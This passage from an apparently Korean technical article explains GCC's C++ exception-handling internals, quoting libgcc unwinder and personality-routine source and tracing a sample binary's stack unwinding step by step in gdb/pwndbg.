탈출합니다.\n/* Subroutine of _Unwind_RaiseException also invoked from _Unwind_Resume.   Unwind the stack calling the personality routine to find both the   exception handler and intermediary cleanup code.  We&#x27;ll only locate   the first such frame here.  Cleanup code will call back into   _Unwind_Resume and we&#x27;ll continue Phase 2 there.  */static _Unwind_Reason_Code_Unwind_RaiseException_Phase2(struct _Unwind_Exception *exc,                              struct _Unwind_Context *context,                              unsigned long *frames_p) &#123;    _Unwind_Reason_Code code;    unsigned long frames = 1;    while (1) &#123;        _Unwind_FrameState fs;        int match_handler;        code = uw_frame_state_for(context, &amp;fs);        /* Identify when we&#x27;ve reached the designated handler context.  */        match_handler = (uw_identify_context(context) == exc-&gt;private_2                             ? _UA_HANDLER_FRAME                             : 0);        if (code != _URC_NO_REASON)            /* Some error encountered.  Usually the unwinder doesn&#x27;t               diagnose these and merely crashes.  */            return _URC_FATAL_PHASE2_ERROR;        /* Unwind successful.  Run the personality routine, if any.  */        if (fs.personality) &#123;            code = (*fs.personality)(1, _UA_CLEANUP_PHASE | match_handler,                                     exc-&gt;exception_class, exc, context);            if (code == _URC_INSTALL_CONTEXT)                break;            if (code != _URC_CONTINUE_UNWIND)                return _URC_FATAL_PHASE2_ERROR;        &#125;        /* Don&#x27;t let us unwind past the handler context.  */        gcc_assert(!match_handler);        uw_update_context(context, &amp;fs);        _Unwind_Frames_Increment(context, frames);    &#125;    *frames_p = frames;    return code;&#125;\n_Unwind_Resume 함수는 catch 블록이 아닌, 자원 해제 등을 수행하는 cleanup 코드에서 필요한 작업을 마치고 스택을 계속 되감기 위해 호출하는 함수입니다. 앞서 eh1 바이너리의 func 함수 그래프를 캡쳐한 그림을 보면 랜딩 패드의 마지막 부분에서 _Unwind_Resume 함수를 호출하는 것을 확인할 수 있습니다. 이 함수를 호출하는 시점에서는 이미 search 단계를 수행하여 호출 스택 상에서 catch 블록의 존재가 확인된 상태입니다. 따라서 곧바로 _Unwind_RaiseException_Phase2 함수를 호출해 cleanup 단계를 진행하면서 다음 랜딩 패드으로 실행 흐름을 옮깁니다.\n/* Resume propagation of an existing exception.  This is used after   e.g. executing cleanup code, and not to implement rethrowing.  */void LIBGCC2_UNWIND_ATTRIBUTE_Unwind_Resume(struct _Unwind_Exception *exc) &#123;    struct _Unwind_Context this_context, cur_context;    _Unwind_Reason_Code code;    unsigned long frames;    uw_init_context(&amp;this_context);    cur_context = this_context;    /* Choose between continuing to process _Unwind_RaiseException       or _Unwind_ForcedUnwind.  */    if (exc-&gt;private_1 == 0)        code = _Unwind_RaiseException_Phase2(exc, &amp;cur_context, &amp;frames);    else        code = _Unwind_ForcedUnwind_Phase2(exc, &amp;cur_context, &amp;frames);    gcc_assert(code == _URC_INSTALL_CONTEXT);    uw_install_context(&amp;this_context, &amp;cur_context, frames);&#125;\nUnwind 라이브러리 내부에서 예외를 일으키고 스택을 되감는 전반적인 로직을 그림으로 나타내면 다음과 같습니다.\n\nC++ ABI\nC++ ABI는 C++ 코드에서 발생한 예외와 unwind 라이브러리 사이를 연결하는 다리 역할을 합니다. C++ ABI에서 사용하는 중요한 구조체로는 __cxa_exception 과 __cxa_eh_globals 가 있습니다.\n__cxa_exception 은 C++ 예외를 나타내는 구조체입니다. Unwind 라이브러리에서 사용하는 예외 구조체인 _Unwind_Exception 을 포함하면서 추가적인 정보를 갖추고 있습니다. exceptionType 필드는 throw 구문에서 전달한 인자의 타입을 나타냅니다. nextException 필드는 C++ 예외 구조체들의 스택을 만들기 위해 사용하는데, 후술합니다.\n// A primary C++ exception object consists of a header, which is a wrapper// around an unwind object header with additional C++ specific information,// followed by the exception object itself.struct __cxa_exception&#123;  // Manage the exception object itself.  std::type_info *exceptionType;  void (_GLIBCXX_CDTOR_CALLABI *exceptionDestructor)(void *);  // The C++ standard has entertaining rules wrt calling set_terminate  // and set_unexpected in the middle of the exception cleanup process.  std::terminate_handler unexpectedHandler;  std::terminate_handler terminateHandler;  // The caught exception stack threads through here.  __cxa_exception *nextException;  // How many nested handlers have caught this exception.  A negated  // value is a signal that this object has been rethrown.  int handlerCount;#ifdef __ARM_EABI_UNWINDER__  // Stack of exceptions in cleanups.  __cxa_exception* nextPropagatingException;  // The number of active cleanup handlers for this exception.  int propagationCount;#else  // Cache parsed handler data from the personality routine Phase 1  // for Phase 2 and __cxa_call_unexpected.  int handlerSwitchValue;  const unsigned char *actionRecord;  const unsigned char *languageSpecificData;  _Unwind_Ptr catchTemp;  void *adjustedPtr;#endif  // The generic exception header.  Must be last.  _Unwind_Exception unwindHeader;&#125;;\n__cxa_eh_globals 는 스레드마다 하나씩 존재하는 C++ 예외 구조체들의 스택입니다. caughtExceptions 필드는 예외 발생 후 처리가 끝난 예외 구조체들의 연결 리스트입니다. uncaughtExceptions 필드는 발생했지만 아직 처리되지 않은 예외들의 개수를 나타냅니다. 현재 스레드의 __cxa_eh_globals 구조체는 __cxa_get_globals 또는 __cxa_get_globals_fast 함수를 통해서 접근할 수 있습니다.\n// Each thread in a C++ program has access to a __cxa_eh_globals object.struct __cxa_eh_globals&#123;  __cxa_exception *caughtExceptions;  unsigned int uncaughtExceptions;#ifdef __ARM_EABI_UNWINDER__  __cxa_exception* propagatingExceptions;#endif&#125;;\nC++ ABI에서 throw 구문으로 발생한 예외를 처리하는 과정은 대략 다음과 같습니다.\n\n__cxa_allocate_exception 함수를 호출하여 __cxa_exception 구조체를 동적 할당합니다.\n__cxa_throw 함수를 호출하면서 할당한 예외 구조체를 인자로 전달합니다. __cxa_throw 함수는 반환하지 않으며, 내부적으로 unwind 라이브러리의 _Unwind_RaiseException 함수를 호출합니다.\n_Unwind_RaiseException 함수 내부에서 personality 루틴을 호출합니다. Personality 루틴은 LSDA를 해석하여 랜딩 패드의 주소를 구합니다.\n랜딩 패드로 점프합니다. 랜딩 패드가 catch 블록인 경우 __cxa_begin_catch 함수를 호출하여 예외 구조체를 스택의 꼭대기에 푸시합니다.\ncatch 블록의 끝나면 __cxa_end_catch 함수를 호출하여 스택에서 예외 구조체를 팝하고 소멸시킵니다.\n\n대부분의 함수가 위에 작성한 내용과 같이 직관적이고 구현이 단순합니다. 따라서 이 문단에서는 personality 루틴의 구현을 중점적으로 살펴보겠습니다.\nGCC의 C++ ABI 구현체에서 personality 루틴의 이름은 __gxx_personality_v0 입니다. (LLVM도 동일한 이름을 사용하지만 구현체가 다릅니다) 이 함수는 소스 코드가 복잡하고 ARM 아키텍처를 위한 코드도 중간중간 섞여 있습니다. 이해를 돕기 위해 아래 코드는 원본 코드에서 필요하지 않은 부분은 제외하였습니다.\n25행에서 LSDA의 주소를 얻습니다. 44행은 반복문을 사용해 LSDA의 call-site 테이블을 순회하면서 예외가 발생한 코드 주소에 해당하는 레코드를 찾아 랜딩 패드의 주소를 계산하고, 액션 테이블에서의 해당하는 레코드의 오프셋 action_record 를 얻습니다. 77행에서 action_record 가 0이면 랜딩 패드는 cleanup 코드로, found_type 에 found_cleanup 을 대입합니다. 이외의 경우 catch 블록에 해당하며, 94행부터 LSDA의 action 테이블을 순회합니다. 발생한 예외의 타입에 대응하는 catch 블록이 존재하는지 확인하고 catch 블록을 찾은 경우 found_type 에 found_handler 를 대입합니다.\nPersonality 루틴은 스택 되감기의 search 단계와 cleanup 단계 중 어느 시점에서 호출되었는지에 따라 동작이 다릅니다. 어느 시점에서 호출되었는지는 두 번째 인자 actions 의 값이 _UA_SEARCH_PHASE 와 _UA_CLEANUP_PHASE 중 무엇인지로 구분합니다. 145행에서 현재 search 단계인 경우 발견한 랜딩 패드가 cleanup 코드면 _URC_CONTINUE_UNWIND, catch 블록이면 _URC_HANDLER_FOUND 를 반환합니다. 반대로 cleanup 단계인 경우 180행에서 _Unwind_SetIP 내장 함수를 호출하여 context-&gt;ra 필드에 랜딩 패드의 주소를 대입하고 _URC_INSTALL_CONTEXT 를 반환합니다.\n#define CONTINUE_UNWINDING                                     \\    do &#123;                                                       \\        if (__gnu_unwind_frame(ue_header, context) != _URC_OK) \\            return _URC_FAILURE;                               \\        return _URC_CONTINUE_UNWIND;                           \\    &#125; while (0)#define PERSONALITY_FUNCTION __gxx_personality_v0_Unwind_Reason_Code PERSONALITY_FUNCTION(int version,                         _Unwind_Action actions,                         _Unwind_Exception_Class exception_class,                         struct _Unwind_Exception *ue_header,                         struct _Unwind_Context *context)&#123;    // ...    // Shortcut for phase 2 found handler for domestic exception.    if (actions == (_UA_CLEANUP_PHASE | _UA_HANDLER_FRAME) &amp;&amp; !foreign_exception) &#123;        restore_caught_exception(ue_header, handler_switch_value,                                 language_specific_data, landing_pad);        found_type = (landing_pad == 0 ? found_terminate : found_handler);        goto install_context;    &#125;    language_specific_data = (const unsigned char *)        _Unwind_GetLanguageSpecificData(context);    // If no LSDA, then there are no handlers or cleanups.    if (!language_specific_data)        CONTINUE_UNWINDING;    // Parse the LSDA header.    p = parse_lsda_header(context, language_specific_data, &amp;info);    info.ttype_base = base_of_encoded_value(info.ttype_encoding, context);    ip = _Unwind_GetIP(context);    if (!ip_before_insn)        --ip;    landing_pad = 0;    action_record = 0;    handler_switch_value = 0;    // Search the call-site table for the action associated with this IP.    while (p &lt; info.action_table) &#123;        _Unwind_Ptr cs_start, cs_len, cs_lp;        _uleb128_t cs_action;        // Note that all call-site encodings are &quot;absolute&quot; displacements.        p = read_encoded_value(0, info.call_site_encoding, p, &amp;cs_start);        p = read_encoded_value(0, info.call_site_encoding, p, &amp;cs_len);        p = read_encoded_value(0, info.call_site_encoding, p, &amp;cs_lp);        p = read_uleb128(p, &amp;cs_action);        // The table is sorted, so if we&#x27;ve passed the ip, stop.        if (ip &lt; info.Start + cs_start)            p = info.action_table;        else if (ip &lt; info.Start + cs_start + cs_len) &#123;            if (cs_lp)                landing_pad = info.LPStart + cs_lp;            if (cs_action)                action_record = info.action_table + cs_action - 1;            goto found_something;        &#125;    &#125;    // If ip is not present in the table, call terminate.  This is for    // a destructor inside a cleanup, or a library routine the compiler    // was not expecting to throw.    found_type = found_terminate;    goto do_something;found_something:    if (landing_pad == 0) &#123;        // If ip is present, and has a null landing pad, there are        // no cleanups or handlers to be run.        found_type = found_nothing;    &#125; else if (action_record == 0) &#123;        // If ip is present, has a non-null landing pad, and a null        // action table offset, then there are only cleanups present.        // Cleanups use a zero switch value, as set above.        found_type = found_cleanup;    &#125; else &#123;        // Otherwise we have a catch handler or exception specification.        _sleb128_t ar_filter, ar_disp;        const std::type_info *catch_type;        _throw_typet *throw_type;        bool saw_cleanup = false;        bool saw_handler = false;        thrown_ptr = __get_object_from_ue(ue_header);        throw_type = __get_exception_header_from_obj(thrown_ptr)-&gt;exceptionType;        while (1) &#123;            p = action_record;            p = read_sleb128(p, &amp;ar_filter);            read_sleb128(p, &amp;ar_disp);            if (ar_filter == 0) &#123;                // Zero filter values are cleanups.                saw_cleanup = true;            &#125; else if (ar_filter &gt; 0) &#123;                // Positive filter values are handlers.                catch_type = get_ttype_entry(&amp;info, ar_filter);                // Null catch type is a catch-all handler; we can catch foreign                // exceptions with this.  Otherwise we must match types.                if (!catch_type || (throw_type &amp;&amp; get_adjusted_ptr(catch_type, throw_type,                                                                   &amp;thrown_ptr))) &#123;                    saw_handler = true;                    break;                &#125;            &#125; else &#123;                // Negative filter values are exception specifications.                // ??? How do foreign exceptions fit in?  As far as I can                // see we can&#x27;t match because there&#x27;s no __cxa_exception                // object to stuff bits in for __cxa_call_unexpected to use.                // Allow them iff the exception spec is non-empty.  I.e.                // a throw() specification results in __unexpected.                if ((throw_type &amp;&amp; !(actions &amp; _UA_FORCE_UNWIND) &amp;&amp; !foreign_exception)                        ? !check_exception_spec(&amp;info, throw_type, thrown_ptr,                                                ar_filter)                        : empty_exception_spec(&amp;info, ar_filter)) &#123;                    saw_handler = true;                    break;                &#125;            &#125;            if (ar_disp == 0)                break;            action_record = p + ar_disp;        &#125;        if (saw_handler) &#123;            handler_switch_value = ar_filter;            found_type = found_handler;        &#125; else            found_type = (saw_cleanup ? found_cleanup : found_nothing);    &#125;do_something:    if (found_type == found_nothing)        CONTINUE_UNWINDING;    if (actions &amp; _UA_SEARCH_PHASE) &#123;        if (found_type == found_cleanup)            CONTINUE_UNWINDING;        // For domestic exceptions, we cache data from phase 1 for phase 2.        if (!foreign_exception) &#123;            save_caught_exception(ue_header, context, thrown_ptr,                                  handler_switch_value, language_specific_data,                                  landing_pad, action_record);        &#125;        return _URC_HANDLER_FOUND;    &#125;install_context:    // ...    &#125; else &#123;        if (found_type == found_terminate)            __cxa_call_terminate(ue_header);        // Cache the TType base value for __cxa_call_unexpected, as we won&#x27;t        // have an _Unwind_Context then.        if (handler_switch_value &lt; 0) &#123;            parse_lsda_header(context, language_specific_data, &amp;info);            info.ttype_base = base_of_encoded_value(info.ttype_encoding,                                                    context);            xh-&gt;catchTemp = base_of_encoded_value(info.ttype_encoding, context);        &#125;    &#125;    /* For targets with pointers smaller than the word size, we must extend the       pointer, and this extension is target dependent.  */    _Unwind_SetGR(context, __builtin_eh_return_data_regno(0),                  __builtin_extend_pointer(ue_header));    _Unwind_SetGR(context, __builtin_eh_return_data_regno(1),                  handler_switch_value);    _Unwind_SetIP(context, landing_pad);    return _URC_INSTALL_CONTEXT;&#125;\nPersonality 루틴의 반환값은 unwind 라이브러리의 _Unwind_RaiseException 함수의 동작과 큰 연관이 있습니다. _Unwind_RaiseException 함수는 search 단계에서 personality 루틴이 _URC_HANDLER_FOUND 를 반환할 때까지 스택을 되감으면서 _Unwind_Context 구조체의 내용을 갱신합니다. _URC_HANDLER_FOUND 의 반환은 예외를 처리할 catch 블록을 발견했다는 신호이자 search 단계의 성공을 나타냅니다. 이어지는 cleanup 단계에서는 _URC_INSTALL_CONTEXT 의 반환을 신호로 하여 랜딩 패드로 실행 흐름을 옮깁니다. 랜딩 패드가 catch 블록이면 예외 처리가 끝나며, cleanup 코드면 _Unwind_Resume 함수를 호출하여 다음 랜딩 패드로 진행하는 스택 되감기를 시작합니다.\n예외가 발생했을 때 C++ ABI와 unwind 라이브러리를 거쳐 처리하는 전체 로직은 다음과 같습니다. 보라색 블록은 프로그램 코드의 일부로 예외가 발생하는 부분과 랜딩 패드, 검은색 블록은 C++ ABI, 회색 블록은 unwind 라이브러리를 나타냅니다.\n\n라이브러리 동적 분석\neh1 바이너리를 동적 분석하면서 예외 처리의 핵심 부분인 _Unwind_RaiseException 함수 및 personality 루틴의 동작을 직접 살펴보겠습니다. _Unwind_RaiseException 함수 내부에서 다음과 같은 5개 위치에 중단점을 설정합니다.\n\nsearch 단계 반복문 내에서 uw_frame_state_for 함수를 호출하는 부분\n\n   0x00007f251026f080 &lt;+304&gt;:   mov    rsi,r13   0x00007f251026f083 &lt;+307&gt;:   mov    rdi,r12=&gt; 0x00007f251026f086 &lt;+310&gt;:   call   0x7f251026d800   0x00007f251026f08b &lt;+315&gt;:   cmp    eax,0x5   0x00007f251026f08e &lt;+318&gt;:   je     0x7f251026f103 &lt;_Unwind_RaiseException+435&gt;\n\nsearch 단계 반복문 내에서 fs.personality 필드가 존재하는지 확인하는 부분\n\n   0x00007f4fc4d81092 &lt;+322&gt;:   jne    0x7f4fc4d81160 &lt;_Unwind_RaiseException+528&gt;   0x00007f4fc4d81098 &lt;+328&gt;:   mov    rax,QWORD PTR [rbp-0x70]=&gt; 0x00007f4fc4d8109c &lt;+332&gt;:   test   rax,rax   0x00007f4fc4d8109f &lt;+335&gt;:   je     0x7f4fc4d810c8 &lt;_Unwind_RaiseException+376&gt;   0x00007f4fc4d810a1 &lt;+337&gt;:   mov    rdx,QWORD PTR [r14]\n\nsearch 단계 반복문 내에서 personality 루틴을 호출하는 부분\n\n   0x00007f4fc4d810aa &lt;+346&gt;:   mov    esi,0x1   0x00007f4fc4d810af &lt;+351&gt;:   mov    edi,0x1=&gt; 0x00007f4fc4d810b4 &lt;+356&gt;:   call   rax   0x00007f4fc4d810b6 &lt;+358&gt;:   cmp    eax,0x6   0x00007f4fc4d810b9 &lt;+361&gt;:   je     0x7f4fc4d81170 &lt;_Unwind_RaiseException+544&gt;\n\n_Unwind_RaiseException_Phase2 함수를 호출하는 부분\n\n   0x00007f4fc4d8126e &lt;+798&gt;:   movups XMMWORD PTR [rbp-0x1e0],xmm0   0x00007f4fc4d81275 &lt;+805&gt;:   movups XMMWORD PTR [rbp-0x1d0],xmm1=&gt; 0x00007f4fc4d8127c &lt;+812&gt;:   call   0x7f4fc4d80b50   0x00007f4fc4d81281 &lt;+817&gt;:   cmp    eax,0x7   0x00007f4fc4d81284 &lt;+820&gt;:   jne    0x7f4fc4d81103 &lt;_Unwind_RaiseException+435&gt;\n\nuw_install_context 매크로 내에서 랜딩 패드로 점프하는 부분\n\n   0x00007f4fc4d812d5 &lt;+901&gt;:   mov    rsp,rcx   0x00007f4fc4d812d8 &lt;+904&gt;:   pop    rcx=&gt; 0x00007f4fc4d812d9 &lt;+905&gt;:   jmp    rcx\n편의를 위해 다음과 같이 .gdbinit 파일을 작성하겠습니다. 이후 gdb 를 실행하면 즉시 중단점으로 이동합니다.\nfile eh1startbreak *(_Unwind_RaiseException+310)break *(_Unwind_RaiseException+332)break *(_Unwind_RaiseException+356)break *(_Unwind_RaiseException+812)break *(_Unwind_RaiseException+905)continue\ngdb 를 실행하면 uw_frame_state_for 함수를 호출하는 1번째 중단점에서 멈춥니다. context-&gt;ra 필드를 확인하면 __cxa_throw 함수에서 _Unwind_RaiseException 함수를 호출한 직후의 주소입니다. 현재 context 구조체는 _Unwind_RaiseException 함수의 프레임을 나타내고 있는 것입니다.\nBreakpoint 2, 0x00007f845bf3b086 in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1pwndbg&gt; pdisass 1 ► 0x7f845bf3b086 &lt;_Unwind_RaiseException+310&gt;    call   0x7f845bf39800                &lt;0x7f845bf39800&gt;   0x7f845bf3b08b &lt;_Unwind_RaiseException+315&gt;    cmp    eax, 5   0x7f845bf3b08e &lt;_Unwind_RaiseException+318&gt;    je     _Unwind_RaiseException+435                &lt;_Unwind_RaiseException+435&gt;pwndbg&gt; x/20gx $rdi0x7ffc2f4d0b70: 0x00007ffc2f4d0de8  0x00007ffc2f4d0df00x7ffc2f4d0b80: 0x0000000000000000  0x00007ffc2f4d0df80x7ffc2f4d0b90: 0x0000000000000000  0x00000000000000000x7ffc2f4d0ba0: 0x00007ffc2f4d0e20  0x00000000000000000x7ffc2f4d0bb0: 0x0000000000000000  0x00000000000000000x7ffc2f4d0bc0: 0x0000000000000000  0x00000000000000000x7ffc2f4d0bd0: 0x00007ffc2f4d0e00  0x00007ffc2f4d0e080x7ffc2f4d0be0: 0x00007ffc2f4d0e10  0x00007ffc2f4d0e180x7ffc2f4d0bf0: 0x00007ffc2f4d0e28  0x00000000000000000x7ffc2f4d0c00: 0x00007ffc2f4d0e30  0x00007f845bfef69cpwndbg&gt; x/4i *(uint64_t *)($rdi+8*19)   0x7f845bfef69c &lt;__cxa_throw+60&gt;: mov    rdi,rbp   0x7f845bfef69f &lt;__cxa_throw+63&gt;: call   0x7f845bfdf690 &lt;__cxa_begin_catch@plt&gt;   0x7f845bfef6a4 &lt;__cxa_throw+68&gt;: call   0x7f845bfdf180 &lt;std::terminate()@plt&gt;   0x7f845bfef6a9:  nop    DWORD PTR [rax+0x0]\ncontinue 커맨드로 계속 실행하면 personality 루틴이 존재하지 않아 다시 1번째 중단점으로 돌아옵니다. 이번에는 context-&gt;ra 필드가 func2 함수에서 __cxa_throw 함수를 호출한 직후의 주소입니다. 반복문에서 스택을 되감으면서 context 구조체가 __cxa_throw 함수의 프레임을 나타내고 있음을 확인할 수 있습니다.\npwndbg&gt; x/20gx $rdi0x7ffc2f4d0b70: 0x00007ffc2f4d0de8  0x00007ffc2f4d0df00x7ffc2f4d0b80: 0x0000000000000000  0x00007ffc2f4d0df80x7ffc2f4d0b90: 0x0000000000000000  0x00000000000000000x7ffc2f4d0ba0: 0x00007ffc2f4d0e30  0x00000000000000000x7ffc2f4d0bb0: 0x0000000000000000  0x00000000000000000x7ffc2f4d0bc0: 0x0000000000000000  0x00000000000000000x7ffc2f4d0bd0: 0x00007ffc2f4d0e38  0x00007ffc2f4d0e400x7ffc2f4d0be0: 0x00007ffc2f4d0e10  0x00007ffc2f4d0e180x7ffc2f4d0bf0: 0x00007ffc2f4d0e48  0x00000000000000000x7ffc2f4d0c00: 0x00007ffc2f4d0e50  0x0000000000401265pwndbg&gt; x/4i *(uint64_t *)($rdi+8*19)   0x401265 &lt;func2(int)+79&gt;:    nop   0x401266 &lt;func2(int)+80&gt;:    leave   0x401267 &lt;func2(int)+81&gt;:    ret   0x401268 &lt;func()&gt;:   endbr64\n이번에도 personality 루틴이 존재하지 않아 1번째 중단점으로 돌아옵니다. context 구조체는 이제 func2 함수의 프레임을 나타내고 있습니다.\nBreakpoint 2, 0x00007f845bf3b086 in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1pwndbg&gt; x/20gx $rdi0x7ffc2f4d0b70: 0x00007ffc2f4d0de8  0x00007ffc2f4d0df00x7ffc2f4d0b80: 0x0000000000000000  0x00007ffc2f4d0df80x7ffc2f4d0b90: 0x0000000000000000  0x00000000000000000x7ffc2f4d0ba0: 0x00007ffc2f4d0e60  0x00000000000000000x7ffc2f4d0bb0: 0x0000000000000000  0x00000000000000000x7ffc2f4d0bc0: 0x0000000000000000  0x00000000000000000x7ffc2f4d0bd0: 0x00007ffc2f4d0e38  0x00007ffc2f4d0e400x7ffc2f4d0be0: 0x00007ffc2f4d0e10  0x00007ffc2f4d0e180x7ffc2f4d0bf0: 0x00007ffc2f4d0e68  0x00000000000000000x7ffc2f4d0c00: 0x00007ffc2f4d0e70  0x00000000004012a6pwndbg&gt; x/4i *(uint64_t *)($rdi+8*19)   0x4012a6 &lt;func()+62&gt;:    lea    rax,[rbp-0x19]   0x4012aa &lt;func()+66&gt;:    mov    rdi,rax   0x4012ad &lt;func()+69&gt;:    call   0x401382 &lt;MyClass::~MyClass()&gt;   0x4012b2 &lt;func()+74&gt;:    nop\nfunc2 함수의 프레임에서 스택을 되감으면 func 함수 내의 MyClass 객체를 소멸하는 랜딩 패드로 이동해야 합니다. 이를 위해 personality 루틴의 주소가 fs-&gt;personality 필드에 대입되어 계속 실행하면 3번째 중단점에서 멈추게 됩니다. 다만 personality 루틴의 호출 이후에도 context-&gt;ra 필드가 랜딩 패드의 주소로 바뀌지는 않습니다. 이는 지금이 search 단계이기 때문입니다. 실제 랜딩 패드 주소를 대입하여 실행 흐름을 옮기는 작업은 cleanup 단계에서 이루어집니다.\nBreakpoint 4, 0x00007f845bf3b0b4 in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1pwndbg&gt; pdisass 1 ► 0x7f845bf3b0b4 &lt;_Unwind_RaiseException+356&gt;    call   rax                           &lt;__gxx_personality_v0&gt;        rdi: 0x1        rsi: 0x1        rdx: 0x474e5543432b2b00        rcx: 0x135f320 ◂— 0x474e5543432b2b00   0x7f845bf3b0b6 &lt;_Unwind_RaiseException+358&gt;    cmp    eax, 6   0x7f845bf3b0b9 &lt;_Unwind_RaiseException+361&gt;    je     _Unwind_RaiseException+544                &lt;_Unwind_RaiseException+544&gt;pwndbg&gt; set $context=$r8pwndbg&gt; nipwndbg&gt; x/20gx $context0x7ffc2f4d0b70: 0x00007ffc2f4d0de8  0x00007ffc2f4d0df00x7ffc2f4d0b80: 0x0000000000000000  0x00007ffc2f4d0df80x7ffc2f4d0b90: 0x0000000000000000  0x00000000000000000x7ffc2f4d0ba0: 0x00007ffc2f4d0e60  0x00000000000000000x7ffc2f4d0bb0: 0x0000000000000000  0x00000000000000000x7ffc2f4d0bc0: 0x0000000000000000  0x00000000000000000x7ffc2f4d0bd0: 0x00007ffc2f4d0e38  0x00007ffc2f4d0e400x7ffc2f4d0be0: 0x00007ffc2f4d0e10  0x00007ffc2f4d0e180x7ffc2f4d0bf0: 0x00007ffc2f4d0e68  0x00000000000000000x7ffc2f4d0c00: 0x00007ffc2f4d0e70  0x00000000004012a6\nPersonality 루틴의 반환값은 _URC_CONTINUE_UNWIND 에 해당하는 8입니다. 스택 되감기를 반복하여 func 함수의 프레임으로 이동합니다.\npwndbg&gt; i r raxrax            0x8                 8pwndbg&gt; cContinuingBreakpoint 2, 0x00007f845bf3b086 in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1pwndbg&gt; pdisass 1 ► 0x7f845bf3b086 &lt;_Unwind_RaiseException+310&gt;    call   0x7f845bf39800                &lt;0x7f845bf39800&gt;   0x7f845bf3b08b &lt;_Unwind_RaiseException+315&gt;    cmp    eax, 5   0x7f845bf3b08e &lt;_Unwind_RaiseException+318&gt;    je     _Unwind_RaiseException+435                &lt;_Unwind_RaiseException+435&gt;pwndbg&gt; x/20gx $rdi0x7ffc2f4d0b70: 0x00007ffc2f4d0de8  0x00007ffc2f4d0df00x7ffc2f4d0b80: 0x0000000000000000  0x00007ffc2f4d0e880x7ffc2f4d0b90: 0x0000000000000000  0x00000000000000000x7ffc2f4d0ba0: 0x00007ffc2f4d0e90  0x00000000000000000x7ffc2f4d0bb0: 0x0000000000000000  0x00000000000000000x7ffc2f4d0bc0: 0x0000000000000000  0x00000000000000000x7ffc2f4d0bd0: 0x00007ffc2f4d0e38  0x00007ffc2f4d0e400x7ffc2f4d0be0: 0x00007ffc2f4d0e10  0x00007ffc2f4d0e180x7ffc2f4d0bf0: 0x00007ffc2f4d0e98  0x00000000000000000x7ffc2f4d0c00: 0x00007ffc2f4d0ea0  0x000000000040130cpwndbg&gt; x/4i *(uint64_t *)($rdi+8*19)   0x40130c &lt;main+30&gt;:  mov    eax,0x0   0x401311 &lt;main+35&gt;:  jmp    0x40135b &lt;main+109&gt;   0x401313 &lt;main+37&gt;:  endbr64   0x401317 &lt;main+41&gt;:  cmp    rdx,0x1\nfunc 함수에서 스택을 되감으면 main 함수의 catch 블록으로 이동해야 합니다. 계속 실행하면 personality 루틴이 호출되며, _URC_HANDLER_FOUND 에 해당하는 6을 반환합니다.\npwndbg&gt; pdisass 1 ► 0x7f845bf3b0b4 &lt;_Unwind_RaiseException+356&gt;    call   rax                           &lt;__gxx_personality_v0&gt;        rdi: 0x1        rsi: 0x1        rdx: 0x474e5543432b2b00        rcx: 0x135f320 ◂— 0x474e5543432b2b00   0x7f845bf3b0b6 &lt;_Unwind_RaiseException+358&gt;    cmp    eax, 6   0x7f845bf3b0b9 &lt;_Unwind_RaiseException+361&gt;    je     _Unwind_RaiseException+544                &lt;_Unwind_RaiseException+544&gt;pwndbg&gt; nipwndbg&gt; i r raxrax            0x6                 6\nsearch 단계의 성공으로 반복문을 탈출합니다. 계속 실행하면 _Unwind_RaiseException_Phase2 함수를 호출하는 4번째 중단점에서 멈추게 됩니다.\nBreakpoint 5, 0x00007f845bf3b27c in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1pwndbg&gt; pdisass 1 ► 0x7f845bf3b27c &lt;_Unwind_RaiseException+812&gt;    call   0x7f845bf3ab50                &lt;0x7f845bf3ab50&gt;   0x7f845bf3b281 &lt;_Unwind_RaiseException+817&gt;    cmp    eax, 7   0x7f845bf3b284 &lt;_Unwind_RaiseException+820&gt;    jne    _Unwind_RaiseException+435                &lt;_Unwind_RaiseException+435&gt;\n_Unwind_RaiseException_Phase2 함수 내에서 personality 루틴을 호출하는 부분에 추가로 중단점을 두겠습니다.\npwndbg&gt; x/43i 0x7f845bf3ab50   0x7f845bf3ab50:  push   r15   0x7f845bf3ab52:  push   r14   # ...   0x7f845bf3abe5:  or     esi,0x2   0x7f845bf3abe8:  mov    edi,0x1   0x7f845bf3abed:  call   rax                    # call personality routine    0x7f845bf3abef:  cmp    eax,0x7   0x7f845bf3abf2:  je     0x7f845bf3ac90pwndbg&gt; break *0x7f845bf3abedBreakpoint 7 at 0x7f845bf3abed\n계속 실행하면 cleanup 단계를 수행하는 _Unwind_RaiseException_Phase2 함수 내부로 진입합니다. 새로 설정한 중단점에서 멈추며, personality 루틴을 호출하기 전 context-&gt;ra 필드의 값은 0x4012a6 으로 func 함수에서 func2 함수를 호출한 직후의 주소입니다.\nBreakpoint 7, 0x00007f845bf3abed in ?? () from /lib/x86_64-linux-gnu/libgcc_s.so.1pwndbg&gt; pdisass 1   0x7f845bf3abe8    mov    edi, 1 ► 0x7f845bf3abed    call   rax                           &lt;__gxx_personality_v0&gt;        rdi: 0x1        rsi: 0x2        rdx: 0x474e5543432b2b00        rcx: 0x135f320 ◂— 0x474e5543432b2b00   0x7f845bf3abef    cmp    eax, 7pwndbg&gt; x/20gx $context0x7ffc2f4d0b70: 0x00007ffc2f4d0de8  0x00007ffc2f4d0df00x7ffc2f4d0b80: 0x0000000000000000  0x00007ffc2f4d0df80x7ffc2f4d0b90: 0x0000000000000000  0x00000000000000000x7ffc2f4d0ba0: 0x00007ffc2f4d0e60  0x00000000000000000x7ffc2f4d0bb0: 0x0000000000000000  0x00000000000000000x7ffc2f4d0bc0: 0x0000000000000000  0x00000000000000000x7ffc2f4d0bd0: 0x00007ffc2f4d0e38  0x00007ffc2f4d0e400x7ffc2f4d0be0: 0x00007ffc2f4d0e10  0x00007ffc2f4d0e180x7ffc2f4d0bf0: 0x00007ffc2f4d0e68  0x00000000000000000x7ffc2f4d0c00: 0x00007ffc2f4d0e70  0x00000000004012a6pwndbg&gt; x/4i *(uint64_t *)($context+8*19)   0x4012a6 &lt;func()+62&gt;:    lea    rax,[rbp-0x19]   0x4012aa &lt;func()+66&gt;:    mov    rdi,rax   0x4012ad &lt;func()+69&gt;:    call   0x401382 &lt;MyClass::~MyClass()&gt;   0x4012b2 &lt;func()+74&gt;:    nop\nPersonality 루틴을 호출하면 